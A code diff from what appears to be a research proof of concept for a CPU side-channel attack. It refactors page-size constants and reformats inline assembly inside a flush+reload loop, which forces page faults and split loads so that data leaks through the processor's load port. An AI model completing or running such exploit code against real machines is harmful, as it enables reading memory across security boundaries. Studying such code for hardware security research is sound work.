@@ -22,7 +22,9 @@ int main(int argc, char *argv[]) {
 		while (1) {
 			asm volatile(
 			"movdqu 1(%0), %%xmm0\n" /* move value into load port */
-			::"r"(&source):"rax"
+			:
+			:"r" (&source)
+			:"rax"
 		);
 		}
 	}
@@ -31,7 +33,7 @@ int main(int argc, char *argv[]) {
 
 	ALLOC_BUFFERS();
 
-	leak = mmap(NULL, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
+	leak = mmap(NULL, PAGE_SIZE*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
 
 	for (size_t offset = START; offset < END; ++offset) {
 		memset(results, 0, sizeof(results));
@@ -40,8 +42,8 @@ int main(int argc, char *argv[]) {
 #define PAGEFAULT
 #ifdef PAGEFAULT
 			/* cause a fault on either the first or the second page */
-			//madvise(leak, 4096, MADV_DONTNEED);
-			madvise(leak+4096, 4096, MADV_DONTNEED);
+			//madvise(leak, PAGE_SIZE, MADV_DONTNEED);
+			madvise(leak+PAGE_SIZE, PAGE_SIZE, MADV_DONTNEED);
 #endif
 
 			flush(reloadbuffer);
@@ -66,7 +68,9 @@ int main(int argc, char *argv[]) {
 			"prefetcht0 (%%rax, %1)\n"
 			"mfence\n"
 			/* start 4096 bytes before the end of the page; offsets>32 should cause a split */
-			::"r"(leak + 4096 - 64 + offset), "r"(reloadbuffer):"rax","rbx","rcx"
+			:
+			:"r" (leak + PAGE_SIZE - 64 + offset), "r" (reloadbuffer)
+			:"rax","rbx","rcx"
 			);
 
 			reload(reloadbuffer, results);
